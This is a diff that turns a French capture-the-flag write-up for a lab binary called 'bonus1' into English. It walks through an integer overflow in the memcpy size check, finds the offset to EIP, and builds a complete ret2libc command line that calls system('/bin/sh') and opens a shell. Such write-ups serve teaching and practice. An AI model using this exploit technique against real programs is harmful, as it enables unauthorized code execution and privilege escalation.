@@ -1,40 +1,35 @@
+For the bonus1, the binary takes two arguments.
 
-
-bonus1 prend deux arguments.
-Le premier est une string qui passe dans atoi.
-Si le retour d'atoi est superieur a 9 alors le programme s'arrete.
-Dans l'assembleur on remarque que le retour d'atoi est multiplie par 4 :
+The first is a string for atoi.
+If the return of atoi is greater than 9 the program stops.
+In assembly code, we found that the return value of atoi is multiplied by 4.
 
    0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
 
-et il est utilise dans le memcpy comme 3eme argument.
-Pour le passer on envoie donc un nombre inferieur a 9, qui mutiplie
-par 4 permettra l'overflow de l'unsigned.
+And the result is use as parameter of size for memcpy.
+To pass the condition we send a number under 9, when multiplied with 4 
+will allow the overflow on an unsigned.
 
 - (UINT_MAX / 4) = - (4294967295 / 4) = -1073741823
 
-Pour l'overflow on prend un peu plus grand : -1073741803
+For the overflow we take little bit greater = -1073741803.
 
-Le second argument est aussi une chaine, qui est utilisee par memcpy
-comme chaine source.
-L'exploit se passe donc dans le memcpy.
-L'exploit se nomme "ret2libc".
-Pour continuer on doit utiliser un overflow et trouver l'offset pour
-controler le registre EIP.
+The second argument is a string too, which is used by memcpy as a source.
+So we have to exploit the memcpy with a "ret2libc" method.
+We have to find the offset to control eip.
 
-Avec un pattern generator on deduit que l'offset est de 56.
-A partir de la on controle EIP, on peut donc utiliser la string
-"/bin/sh" qui est stockee a :  0x8048583
+With a pattern generator we find the offset at 56.
+Now we can control eip, we can use a "/bin/sh" string, it's stocked at: 0x8048583.
+We can use it with the system function ;
 
-On va l'utiliser comme argument a la fonction system :
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 
-Pour cela on envoie :
+For that we send:
 
 ./bonus1 [arg1] [PADDING + ADDRESS SYSTEM + 4 BYTES + ADDRESS /bin/sh]
 
-Les 4 bytes entre les deux addresses servent passer l'addresse de retour de EIP.
+The 4 bytes between adress are used to skip the return adress of the main function.
 
 ./bonus1 "-1073741803" $(python -c 'print "A" * 56 + "\x60\xb0\xe6\xb7" + "OUAI" + "\x83\x85\x04\x08"')
 $ id
